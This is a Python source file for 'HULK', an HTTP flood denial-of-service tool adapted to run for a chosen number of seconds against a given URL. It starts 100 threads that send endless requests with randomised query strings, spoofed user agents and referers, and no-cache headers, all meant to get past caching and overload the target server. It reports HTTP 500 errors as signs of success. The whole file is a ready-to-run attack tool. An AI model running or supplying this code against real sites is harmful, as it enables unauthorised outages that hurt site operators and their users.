#!/usr/bin/env python3
# ----------------------------------------------------------------------------------------------
# HULK - HTTP Unbearable Load King (Python 3, Timed, Modified Argument Order)
# Usage: python3 hulk.py <duration> <url>
# Example: python3 hulk.py 60 http://192.168.1.172
# ----------------------------------------------------------------------------------------------

import os
import random
import re
import sys
import threading
import time
import urllib.error
import urllib.request

# Globals
url = ''
host = ''
headers_useragents = []
headers_referers = []
request_counter = 0
flag = 0


def inc_counter():
    global request_counter
    request_counter += 1


def set_flag(val):
    global flag
    flag = val


def useragent_list():
    global headers_useragents
    headers_useragents = [
        'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en) Gecko/20090824 Firefox/3.5.3',
        'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 Chrome/89.0 Safari/537.36',
        'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
    ]


def referer_list():
    global headers_referers
    headers_referers = ['http://www.google.com/?q=', 'http://www.bing.com/search?q=', f'http://{host}/']


def buildblock(size):
    return ''.join(chr(random.randint(65, 90)) for _ in range(size))


def usage():
    print('---------------------------------------------------')
    print('USAGE: python3 hulk.py <duration_seconds> <url>')
    print('Example: python3 hulk.py 60 http://192.168.1.172')
    print('---------------------------------------------------')


def httpcall(target_url):
    useragent_list()
    referer_list()
    param_joiner = '&' if '?' in target_url else '?'
    full_url = target_url + param_joiner + buildblock(random.randint(3, 10)) + '=' + buildblock(random.randint(3, 10))

    request = urllib.request.Request(full_url)
    request.add_header('User-Agent', random.choice(headers_useragents))
    request.add_header('Cache-Control', 'no-cache')
    request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
    request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5, 10)))
    request.add_header('Keep-Alive', str(random.randint(110, 120)))
    request.add_header('Connection', 'keep-alive')
    request.add_header('Host', host)

    try:
        urllib.request.urlopen(request)
    except urllib.error.HTTPError:
        set_flag(1)
        print('[!] HTTP 500 Error – overload indication')
    except urllib.error.URLError:
        sys.exit('[!] Failed to reach host')
    else:
        inc_counter()


class HTTPThread(threading.Thread):
    def run(self):
        try:
            while flag < 2:
                httpcall(url)
        except Exception:
            pass


class MonitorThread(threading.Thread):
    def run(self):
        previous = request_counter
        while flag == 0:
            time.sleep(5)
            if request_counter - previous >= 100:
                print(f'[+] {request_counter} requests sent')
                previous = request_counter
        print('[*] HULK attack ended.')


# Entry
if __name__ == '__main__':
    if len(sys.argv) < 3:
        usage()
        sys.exit(1)

    try:
        duration = int(sys.argv[1])
    except ValueError:
        usage()
        sys.exit('[!] First argument must be an integer duration in seconds.')

    url = sys.argv[2]
    if not url.startswith('http'):
        url = 'http://' + url

    m = re.search(r'(https?\://)?([^/]+)', url)
    host = m.group(2)

    print(f'[*] Starting HULK attack on {url} for {duration} seconds.')

    threads = []
    for _ in range(100):
        t = HTTPThread()
        t.daemon = True
        t.start()
        threads.append(t)

    monitor = MonitorThread()
    monitor.daemon = True
    monitor.start()

    time.sleep(duration)
    print('[*] Duration reached. Exiting now.')
    os._exit(0)
